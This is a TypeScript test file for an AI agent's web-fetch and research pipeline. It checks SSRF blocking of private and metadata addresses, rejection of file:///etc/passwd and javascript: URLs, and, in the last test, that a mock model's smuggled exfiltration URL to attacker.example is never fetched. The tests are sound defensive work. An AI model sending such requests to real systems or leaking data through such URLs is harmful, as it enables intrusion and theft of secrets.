/** Web research: SSRF rules of fetch_url, page text extraction, and when/what to search. */
import http from 'node:http';
import type { AddressInfo } from 'node:net';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { extractText, selectPassages } from '../../apps/node/src/agent/extract.js';
import { checkUrl, FetchRefused, guardedFetch, isBlockedAddress } from '../../apps/node/src/agent/fetch.js';
import { cleanQuestion, research, urlsIn, wantsWeb, writeQuery } from '../../apps/node/src/agent/research.js';

describe('fetch_url: address rules', () => {
  it.each([
    '127.0.0.1',
    '127.9.9.9',
    '0.0.0.0',
    '10.1.2.3',
    '172.16.0.1',
    '172.31.255.255',
    '192.168.1.1',
    '169.254.169.254', // cloud metadata
    '100.64.0.1', // CGNAT
    '224.0.0.1',
    '255.255.255.255',
    '::1',
    '::',
    'fc00::1',
    'fd12:3456::1',
    'fe80::1',
    '::ffff:127.0.0.1', // IPv4-mapped
    '::ffff:7f00:1', // IPv4-mapped, hex form
    '::ffff:169.254.169.254',
    '64:ff9b::7f00:1', // NAT64
    '2002:7f00:1::', // 6to4
    'not-an-ip',
  ])('blocks %s', (a) => expect(isBlockedAddress(a)).toBe(true));

  it.each(['1.1.1.1', '93.184.215.14', '172.32.0.1', '2606:4700:4700::1111', '::ffff:1.1.1.1'])('allows public %s', (a) => expect(isBlockedAddress(a)).toBe(false));

  it('parses odd IPv4 spellings before checking (never string-matches)', () => {
    for (const u of ['http://2130706433/', 'http://0177.0.0.1/', 'http://0x7f.1/', 'http://127.1/', 'http://[::ffff:127.0.0.1]/']) {
      const host = checkUrl(u).hostname.replace(/^\[|\]$/g, '');
      expect(isBlockedAddress(host), u).toBe(true);
    }
  });

  it('refuses non-http schemes, non-default ports and credentials', () => {
    for (const u of ['file:///etc/passwd', 'ftp://example.com/', 'gopher://example.com/', 'http://example.com:8080/', 'https://user:pw@example.com/', 'javascript:alert(1)', 'not a url']) {
      expect(() => checkUrl(u), u).toThrow(FetchRefused);
    }
    expect(checkUrl('https://example.com/a#frag').toString()).toBe('https://example.com/a');
  });

  it('refuses a name that resolves to a private address (also when only one of its addresses is private)', async () => {
    const resolve = async () => [
      { address: '93.184.215.14', family: 4 },
      { address: '10.0.0.5', family: 4 },
    ];
    await expect(guardedFetch('http://rebind.example/', { resolve })).rejects.toMatchObject({ reason: 'blocked_address' });
    await expect(guardedFetch('http://localhost/')).rejects.toMatchObject({ reason: 'blocked_address' });
    await expect(guardedFetch('http://169.254.169.254/latest/meta-data/')).rejects.toMatchObject({ reason: 'blocked_address' });
  });
});

describe('fetch_url against a local server (private addresses allowed for the test only)', () => {
  let server: http.Server;
  let base: string;
  let hits: string[] = [];
  beforeAll(async () => {
    server = http.createServer((req, res) => {
      hits.push(req.url!);
      if (req.url === '/page') {
        res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
        res.end('<html><head><title>T</title></head><body><p>Hello wolves, this is a page.</p></body></html>');
      } else if (req.url === '/to-private') {
        res.writeHead(302, { location: 'http://169.254.169.254/latest/' });
        res.end();
      } else if (req.url?.startsWith('/loop')) {
        res.writeHead(302, { location: `/loop${hits.length}` });
        res.end();
      } else if (req.url === '/big') {
        res.writeHead(200, { 'content-type': 'text/plain' });
        res.end('x'.repeat(50_000));
      } else if (req.url === '/pdf') {
        res.writeHead(200, { 'content-type': 'application/pdf' });
        res.end('%PDF');
      } else if (req.url === '/slow') {
        res.writeHead(200, { 'content-type': 'text/html' });
        res.write('<p>start');
        // never finishes
      } else {
        res.writeHead(404);
        res.end();
      }
    });
    await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
    base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  });
  afterAll(() => {
    server.closeAllConnections();
    server.close();
  });

  const opts = (extra = {}) => ({ allowLoopback: true, ...extra });

  it('reads a page when loopback is allowed (test hook)', async () => {
    const p = await guardedFetch(`${base}/page`, opts());
    expect(p.body).toContain('Hello wolves');
    expect(p.contentType).toMatch(/text\/html/);
  });

  it('refuses a non-default port and loopback without the test hook', async () => {
    hits = [];
    await expect(guardedFetch(`${base}/page`)).rejects.toMatchObject({ reason: 'bad_url' });
    await expect(guardedFetch('http://127.0.0.1/page')).rejects.toMatchObject({ reason: 'blocked_address' });
    expect(hits).toEqual([]);
  });

  it('checks every redirect hop: a redirect to the metadata address is refused', async () => {
    await expect(guardedFetch(`${base}/to-private`, opts())).rejects.toMatchObject({ reason: 'blocked_address' });
  });

  it('stops after 3 redirects', async () => {
    await expect(guardedFetch(`${base}/loop0`, opts())).rejects.toMatchObject({ reason: 'too_many_redirects' });
  });

  it('caps the size while streaming', async () => {
    const p = await guardedFetch(`${base}/big`, opts({ maxBytes: 10_000 }));
    expect(p.body.length).toBe(10_000);
    expect(p.truncated).toBe(true);
  });

  it('reads only web pages', async () => {
    await expect(guardedFetch(`${base}/pdf`, opts())).rejects.toMatchObject({ reason: 'unsupported_type' });
  });

  it('gives up on a page that never finishes', async () => {
    const t0 = Date.now();
    await expect(guardedFetch(`${base}/slow`, opts({ timeoutMs: 1000 }))).rejects.toMatchObject({ reason: 'timeout' });
    expect(Date.now() - t0).toBeLessThan(3000);
  });
});

describe('page text', () => {
  const html = `<!doctype html><html><head><title>Gray wolf &amp; packs</title><script>var x = "<p>not text</p>";</script><style>p{}</style></head>
  <body><nav><a>Home</a> <a>About us page link</a></nav><header>Site header with a long slogan here</header>
  <article><h1>Gray wolf</h1><p>The gray wolf lives in packs of four to nine animals on average.</p>
  <p>Packs defend a territory &mdash; sometimes over 1,000&nbsp;km&#178; &#x2014; against other packs.</p></article>
  <footer>Copyright footer text that is long enough</footer><!-- <p>comment</p> --></body></html>`;

  it('keeps the main text and drops scripts, menus, headers, footers and comments', () => {
    const { title, text } = extractText(html, 'text/html');
    expect(title).toBe('Gray wolf & packs');
    expect(text).toContain('packs of four to nine animals');
    expect(text).toContain('Packs defend a territory — sometimes over 1,000 km² — against other packs.');
    for (const junk of ['not text', 'Home', 'Site header', 'Copyright', 'comment']) expect(text).not.toContain(junk);
  });

  it('picks the passages that match the question, in page order', () => {
    const paras = Array.from({ length: 40 }, (_, i) => (i === 25 ? 'Wolf pack size averages five to nine wolves in Yellowstone.' : `Paragraph ${i} about the history of the region and its rivers and hills.`));
    const out = selectPassages(paras.join('\n'), 'how big is a wolf pack', 400);
    expect(out).toContain('five to nine wolves');
    expect(out.length).toBeLessThanOrEqual(500);
  });
});

describe('when and what to search', () => {
  it.each([
    'search the web for wolf pack size',
    'Can you look up the population of Rome?',
    'please google llama.cpp release notes',
    'What does https://example.com/article say?',
    'latest news about the Mars mission',
    'what is the weather in Milan today',
    'find it on the internet: best hiking boots',
  ])('searches for: %s', (q) => expect(wantsWeb(q)).toBe(true));

  it.each(['How does binary search work?', 'Write a Python function to search a list', 'What is 17 × 23?', 'Explain recursion', 'share this with the pack'])('does not search for: %s', (q) =>
    expect(wantsWeb(q)).toBe(false),
  );

  it('extracts at most two links the person wrote', () => {
    expect(urlsIn('read https://a.example/x, then http://b.example/y. And https://c.example')).toEqual(['https://a.example/x', 'http://b.example/y']);
  });

  it('turns a request into a query', () => {
    expect(cleanQuestion('Can you search the web for how big a typical wolf pack is?')).toBe('how big a typical wolf pack is');
    expect(cleanQuestion('please look up the tallest mountain in the Alps')).toBe('the tallest mountain in the Alps');
    expect(cleanQuestion('What is the capital of France?')).toBe('What is the capital of France');
  });

  const never = async () => {
    throw new Error('the model must not be asked for a first question');
  };
  const ctl = new AbortController();

  it('searches a first question as asked, without asking the model', async () => {
    expect(await writeQuery([{ role: 'user', content: 'How tall is Mont Blanc?' }], 'How tall is Mont Blanc?', { generate: never }, ctl.signal)).toBe('How tall is Mont Blanc');
  });

  it('lets the model rewrite a follow-up, but rejects answers and invented numbers', async () => {
    const history = [
      { role: 'user' as const, content: 'How tall is Mont Blanc?' },
      { role: 'assistant' as const, content: 'About 4,806 m.' },
      { role: 'user' as const, content: 'and the Matterhorn?' },
    ];
    const gen = (text: string) => async () => text;
    expect(await writeQuery(history, 'and the Matterhorn?', { generate: gen('Matterhorn height') }, ctl.signal)).toBe('Matterhorn height');
    expect(await writeQuery(history, 'and the Matterhorn?', { generate: gen('The Matterhorn is 4478 metres tall and very steep.') }, ctl.signal)).toBe('and the Matterhorn');
    expect(await writeQuery(history, 'and the Matterhorn?', { generate: gen('cheap flights to Bali') }, ctl.signal)).toBe('and the Matterhorn');
  });

  it('only ever reads URLs from search results or the message, never from model output', async () => {
    const fetched: string[] = [];
    const steps: string[] = [];
    // The "model" tries to smuggle a URL in its query; the pipeline must not fetch it.
    const r = await research(
      [
        { role: 'user', content: 'first question' },
        { role: 'assistant', content: 'answer' },
        { role: 'user', content: 'and the follow-up about wolves?' },
      ],
      {
        searxUrl: 'http://unused',
        maxPages: 2,
        budgetChars: 2000,
        generate: async () => 'wolves http://attacker.example/?d=secret',
        search: async (q) => {
          fetched.push(`search:${q}`);
          return [{ title: 'Result', url: 'http://127.0.0.1/only-this', snippet: 'Wolves live in packs.' }];
        },
        onStep: (s) => steps.push(`${s.kind}:${s.status}`),
      },
      ctl.signal,
    );
    // The result URL is private, so it is refused; the attacker URL is never even attempted.
    expect(fetched.every((f) => !f.includes('attacker.example') || f.startsWith('search:'))).toBe(true);
    expect(r.sources.map((s) => s.url)).toEqual(['http://127.0.0.1/only-this']);
    expect(r.sources[0]!.kind).toBe('snippet');
    expect(steps).toContain('read:failed');
    expect(r.context).toContain('untrusted');
  });
});
